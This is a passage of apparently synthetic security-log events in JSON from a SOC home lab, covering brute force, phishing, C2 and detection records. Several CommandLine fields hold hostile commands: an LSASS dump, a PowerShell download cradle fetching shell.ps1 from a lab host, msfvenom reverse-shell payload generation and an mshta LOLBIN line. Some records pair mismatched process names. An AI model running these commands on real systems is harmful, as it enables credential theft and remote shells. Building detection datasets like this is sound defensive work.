  {
    "TimeGenerated": "2026-04-20T11:14:37.668268",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "194.165.16.11",
    "DestinationIP": "192.168.56.103",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T08:29:37.663233",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T07:53:37.663381",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T12:41:37.662332",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-24T01:03:37.663577",
    "EventType": "Sysmon Network Connection",
    "Severity": "High",
    "EventCode": 3,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "cmd.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T22:31:37.668472",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "91.234.56.78",
    "DestinationIP": "10.0.2.15",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:17:37.662528",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-19T16:29:37.667877",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T20:07:37.661337",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T15:58:37.661005",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T23:38:37.660871",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T07:23:37.660465",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "KALI-LAB-01",
    "SourceIP": "91.234.56.78",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T22:31:37.661696",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T22:48:37.667851",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T05:58:37.669139",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T15:22:37.666915",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "attacker",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": null,
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T12:08:37.665277",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "svc.backup",
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:05:37.668226",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.103",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T06:02:37.662843",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T15:39:37.662591",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "ubuntu",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T06:39:37.663674",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "103.45.78.21",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "bitsadmin.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T12:39:37.662362",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-24T03:59:37.665060",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-19T16:40:37.659678",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "svc.backup",
    "Computer": "ELK-SERVER-01",
    "SourceIP": "45.67.22.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T14:18:37.664450",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "dev.engineer",
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell.exe -enc SQBFAFgA",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T17:56:37.662546",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "root",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T16:17:37.659896",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "77.73.133.84",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T20:41:37.659746",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "45.67.22.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T20:46:37.664223",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1')",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-20T09:06:37.664181",
    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "mshta.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T23:56:37.669129",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T03:31:37.664269",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-21T09:30:37.668383",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "45.67.22.10",
    "DestinationIP": "10.0.2.10",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T04:18:37.665619",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "svc.splunk",
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T10:44:37.665236",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-22T04:54:37.664103",
    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "mshta.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T02:17:37.659932",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "77.73.133.84",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T06:04:37.668691",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "103.45.78.21",
    "DestinationIP": "192.168.56.101",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T11:08:37.660907",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T13:57:37.667183",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T10:31:37.661673",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T11:58:37.666439",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "194.165.16.11",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T05:58:37.667693",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T05:12:37.665931",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "attacker",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T16:49:37.664519",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "john.doe",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -nop -w hidden -c IEX",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T03:38:37.669246",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T07:41:37.662916",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T16:58:37.664713",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T06:40:37.665640",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": "192.168.56.103",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T17:43:37.669356",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T04:59:37.668161",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "attacker",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T15:53:37.668778",
    "EventType": "IDS Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T12:43:37.668751",
    "EventType": "IDS Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T16:28:37.659720",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "185.220.101.45",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T09:11:37.665340",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "attacker",
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T17:37:37.663537",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "certutil.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T22:29:37.665847",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T02:23:37.668859",
    "EventType": "IDS Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.101",
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T23:39:37.660470",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "ELK-SERVER-01",
    "SourceIP": "185.220.101.45",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T04:10:37.664237",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-22T09:43:37.667051",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T01:21:37.664860",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "svc.backup",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "mshta vbscript:Execute(\"CreateObject(\"Wscript.Shell\").Run\")",
    "ProcessName": "regsvr32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T22:25:37.664026",
